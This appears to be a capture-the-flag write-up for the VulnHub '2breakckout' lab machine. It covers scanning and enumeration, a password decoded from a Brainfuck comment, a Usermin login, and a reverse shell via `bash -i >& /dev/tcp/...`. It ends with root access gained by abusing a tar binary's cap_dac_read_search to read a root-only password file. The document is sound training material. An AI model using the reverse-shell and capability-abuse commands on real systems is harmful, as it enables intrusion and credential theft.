## 2breakckout VulnHub Challenge Writeup

### Overview

The "2breakckout" VulnHub machine is a capture-the-flag (CTF) challenge that involves network reconnaissance, web enumeration, exploiting a Brainfuck interpreter for credentials, gaining an initial shell via Usermin, and finally escalating privileges using a misconfigured `tar` binary with capabilities.

### Reconnaissance

#### Network Scanning

I began by identifying the target machine on the network using `netdiscover` to scan the local subnet.

```shellscript
netdiscover -r 192.168.1.0/24
```

The target machine was identified at `192.168.1.9` with the MAC Address `08:00:27:76:E9:AF` (PCS Systemtechnik GmbH / Oracle VirtualBox virtual NIC).

Next, I performed a comprehensive port scan using `nmap` to identify open services and their versions on the target.

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.9 -p-
```

**Results:**

- **80/tcp**: `http` Apache httpd 2.4.51 ((Debian))
- **139/tcp**: `netbios-ssn` Samba smbd 4
- **445/tcp**: `netbios-ssn` Samba smbd 4
- **10000/tcp**: `http` MiniServ 1.981 (Webmin httpd)
- **20000/tcp**: `http` MiniServ 1.830 (Webmin httpd)


The presence of Webmin/Usermin on ports 10000 and 20000 was immediately noteworthy.

#### SMB Enumeration

I attempted to enumerate SMB shares using `smbclient` and `enum4linux-ng`.

```shellscript
smbclient -L //192.168.1.9 -N
enum4linux-ng 192.168.1.9
```

`smbclient` initially failed to negotiate a compatible protocol, but `enum4linux-ng` provided more details. It confirmed SMB was accessible on ports 139 and 445, identified the workgroup as `WORKGROUP`, and the NetBIOS computer name as `BREAKOUT`. It also showed that the server allowed null sessions. However, no accessible shares with interesting content were found.

#### Web Enumeration (Port 80)

I used `gobuster` to enumerate directories and files on the web server running on port 80.

```shellscript
gobuster dir -u http://192.168.1.9/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
gobuster dir -u http://192.168.1.9/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
```

The scans revealed `/manual` (301 redirect) and `/server-status` (403 Forbidden). The `raft-medium-files-lowercase.txt` wordlist found `index.html` (200 OK) and various `.htaccess` related files (403 Forbidden).

I then used `curl` to inspect the `index.html` content on port 80:

```shellscript
curl http://192.168.1.9
```

The HTML source code contained a hidden comment at the very end:

```html
<!--don't worry no one will get here, it's safe to share with you my access. Its encrypted :)++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.-->
```

This looked like Brainfuck code.

#### Decrypting Brainfuck Code

I copied the Brainfuck code `++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.` into an online Brainfuck interpreter.

<img width="819" height="229" alt="image" src="https://github.com/user-attachments/assets/52bf3963-234d-429e-b7d2-1cb4cc2cc3f0" />


This screenshot shows an online Brainfuck Interpreter with the provided Brainfuck code in the input field. The output section clearly displays the decoded string: `.2uqPEfj3D<P'a-3`.

The output of the Brainfuck code was: `.2uqPEfj3D<P'a-3`. This appeared to be a password.

#### Usermin Enumeration and Login

From the `enum4linux-ng` output, I had identified a user named `cyber` (S-1-22-1-1000 Unix User\cyber). Given the discovered password, I attempted to log into Usermin on port 20000.

<img width="1150" height="629" alt="image" src="https://github.com/user-attachments/assets/4f26f8ad-89cc-47f3-b029-97560a8b9b16" />


This screenshot displays the Usermin Account Information page, confirming the system hostname as `breakout` and the Usermin Version as `1.830`. This information is crucial for identifying potential exploits.

I successfully logged into Usermin using the username `cyber` and the password `.2uqPEfj3D<P'a-3`.

### Initial Foothold

After logging into Usermin, I explored the dashboard. The provided logs indicate attempts to use `searchsploit` for Usermin 1.820 exploits (like `50234.py`), but these attempts failed. Instead, the user directly executed a reverse shell from the Usermin dashboard.

I navigated to a section within Usermin that allowed command execution (e.g., a terminal or a module that executes system commands, often found under "Tools" or "Others"). In this case, the SSH Configuration page provided a convenient input field.

I set up a `netcat` listener on my attacking machine (Kali Linux) on port 4444:

```shellscript
nc -lnvp 4444
```

Then, I entered and executed a reverse shell command in the Usermin interface.

<img width="1356" height="532" alt="image" src="https://github.com/user-attachments/assets/c0a62994-7390-4c3a-93d5-ef8a27691f22" />


This screenshot shows the Usermin interface, specifically the SSH Configuration page. In the terminal-like input area, the command `bash -i >& /dev/tcp/192.168.1.5/4444 0>&1` is visible, indicating the execution of a reverse shell.

Upon executing the command, I received a reverse shell on my `netcat` listener as the `cyber` user:

```plaintext
Connection received on 192.168.1.9 58716
bash: cannot set terminal process group (5912): Inappropriate ioctl for device
bash: no job control in this shell
cyber@breakout:~$
```

I then upgraded to a proper TTY shell for better interaction:

```shellscript
python3 -c "import pty;pty.spawn('/bin/bash')"
```

### Privilege Escalation

Once I had a shell as `cyber`, I began enumerating the system for privilege escalation vectors. I listed the files in the current directory and checked for SUID binaries.

```shellscript
cyber@breakout:~$ ls -la
cyber@breakout:~$ find / -perm -4000 2>/dev/null
```

The `ls -la` command revealed an interesting binary in the current directory: `tar`.

This screenshot shows the Usermin File Manager, displaying the contents of the `/home/cyber` directory. Notable files include `shell.php`, `user.txt`, and `tar` (owned by root with `rwxr-xr-x` permissions, but its capabilities are key).

Further investigation using `getcap` revealed that `/home/cyber/tar` had special capabilities:

```shellscript
cyber@breakout:~$ getcap -r / 2> /dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

The `cap_dac_read_search=ep` capability on `/home/cyber/tar` is critical. It means the `tar` binary can bypass discretionary access control (DAC) checks for reading and searching files, effectively allowing it to read any file on the system, even if `cyber` doesn't have direct read permissions.

I attempted to read the `user.txt` file in the current directory:

```shellscript
cyber@breakout:~$ cat user.txt
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
```

This was the user flag.

Now, to escalate privileges to root, I needed to find a way to read a sensitive file like `/etc/shadow` or a root flag. After trying various common root flag locations, I looked for backup files.

I found a promising backup file: `/var/backups/.old_pass.bak`.

```shellscript
cyber@breakout:~/root$ ls -la /var/backups/.old_pass.bak
-rw------- 1 root root 17 Oct 20  2021 /var/backups/.old_pass.bak
```

Since `tar` had `cap_dac_read_search`, I could use it to read the content of this file, even though it was owned by `root` and had restrictive permissions.

```shellscript
cyber@breakout:~/root$ /home/cyber/tar xf /var/backups/.old_pass.bak -I "/bin/bash -c 'cat 1>&2'"
Ts&4&YurgtRX(=~h
```

This command used the `tar` binary with its capabilities to extract the content of `/var/backups/.old_pass.bak` and pipe it to `cat`, revealing the password: `Ts&4&YurgtRX(=~h`.

Finally, I used this password to switch to the `root` user:

```shellscript
cyber@breakout:~/root$ su root
Password: Ts&4&YurgtRX(=~h
root@breakout:/home/cyber/root# id
uid=0(root) gid=0(root) groups=0(root)
```

I had successfully gained root access!

### Root Flag

With root privileges, I navigated to the `/root` directory to find the final flag.

```shellscript
root@breakout:/home/cyber/root# cd /root
root@breakout:~# ls
rOOt.txt
root@breakout:~# cat rOOt.txt
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
Author: Icex64 & Empire Cybersecurity
```

**Root Flag:** `3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}`

## Tools Used

- `netdiscover` - Network discovery
- `nmap` - Port scanning and service version detection
- `gobuster` - Directory and file enumeration
- Online Brainfuck Interpreter - Decrypting hidden code
- Usermin - Web-based administration panel
- `netcat` - Setting up listeners for reverse shells
- `python3` - Upgrading TTY shell
- `getcap` - Checking file capabilities
- `tar` - Exploiting capabilities for privilege escalation
- `su` - Switching user


## Flags Found

1. **User Flag:** `3mp!r3{You_Manage_To_Break_To_My_Secure_Access}`
2. **Root Flag:** `3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}`


SuggestionsClose suggestions[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}Add IntegrationLearn more about Linux capabilitiesPractice Webmin/Usermin exploitationExplore Brainfuck and other esoteric languagesAutomate post-exploitation enumerationResearch common backup file locationsScroll leftScroll right
